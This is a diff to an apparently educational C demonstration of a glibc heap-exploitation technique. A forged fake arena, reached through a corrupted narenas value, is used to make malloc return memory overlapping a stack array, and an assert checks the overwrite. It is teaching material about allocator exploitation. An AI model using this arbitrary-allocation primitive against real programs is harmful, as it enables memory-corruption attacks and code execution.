@@ -2,6 +2,8 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <assert.h>
 #include <inttypes.h>
 
 /*
@@ -291,7 +293,12 @@ int main(void) {
      * in order to trigger a partial unlinking between
      * head and narenas-0x10.
      * */
+    unsigned long target[4];
+    target[0] = 0;
+    target[1] = 0x73;
+    target[2] = 0x4141414141414141;
     INTM = malloc(0x98);
+    *(unsigned long*)(INTM+0x20) = (unsigned long)target;
 
     printf("Perfect. narenas is now set to the address of the unsorted bin's head\n");
     printf("which should be large enough to exceed the existing arena limit.\n\n");
@@ -333,6 +340,17 @@ int main(void) {
     printf("by setting a breakpoint at _int_malloc() and making another call\n");
     printf("to malloc(). You should then be able to see that the 'mstate av'\n");
     printf("pointer (rsi) is equals to the address of the INTM chunk.\n");
+
+    /*
+     * use the fake arena to perform arbitrary allocation
+     * */
+    puts("\n\nNow we can use the fake arena to perform arbitrary allocation!");
+    printf("For example, overwrite the target array on stack @ %p with value: %#lx\n", &target[2], target[2]);
+    void *p = malloc(0x60);
+    printf("The next allocation @ %p\n", p);
+    memset(p, 'B', 8);
+    printf("Overwriting the newly allocated chunk changes the target array as well: %#lx\n", target[2]);
+    assert(target[2] == 0x4242424242424242);
 
     return EXIT_SUCCESS;
 }
